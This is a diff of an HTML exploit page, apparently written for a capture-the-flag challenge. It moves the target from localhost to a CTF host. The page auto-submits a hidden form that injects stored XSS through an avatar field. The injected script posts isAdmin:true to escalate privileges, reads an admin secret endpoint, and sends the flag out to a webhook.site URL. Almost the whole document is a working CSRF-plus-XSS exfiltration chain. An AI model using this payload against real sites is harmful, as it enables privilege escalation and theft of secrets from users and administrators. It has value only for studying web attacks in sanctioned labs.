@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Test Webhook Fix</h1>
-<form id="f" action="http://localhost:3000/api/update-profile" method="POST" target="x">
+<form id="f" action="http://ctf.learn-it.org:39951/api/update-profile" method="POST" target="x">
 <input name="avatar[skin]" value="x" />
 <input name="avatar[hair]" value="x" />
 <input name="avatar[eyes]" value="x" />
 <input name="avatar[shirt]" value="x" />
-<input name="avatar[background]" value='"></svg><img src=x onerror="var xhr=new XMLHttpRequest();xhr.open(&apos;GET&apos;,&apos;https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?step1=xss_triggered&apos;);xhr.send()"><svg fill="' />
+<input name="avatar[background]" value='"></svg><img src=x onerror="var x=new XMLHttpRequest();x.open(&apos;POST&apos;,&apos;/api/update-profile&apos;);x.setRequestHeader(&apos;Content-Type&apos;,&apos;application/json&apos;);x.onload=function(){var y=new XMLHttpRequest();y.open(&apos;GET&apos;,&apos;/api/admin/secret&apos;);y.onload=function(){var i=new Image();i.src=&apos;https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag=&apos;+encodeURIComponent(JSON.parse(y.responseText).flag)};y.send()};x.send(&apos;{&quot;isAdmin&quot;:true}&apos;)"><svg fill="' />
 </form>
 <iframe name="x" style="display:none"></iframe>
 <script>
 document.getElementById('f').submit();
-setTimeout(function(){ location='http://localhost:3000/dashboard'; }, 3000);
+setTimeout(function(){ location='http://ctf.learn-it.org:39951/dashboard'; }, 3000);
 </script>
 </body>
 </html>
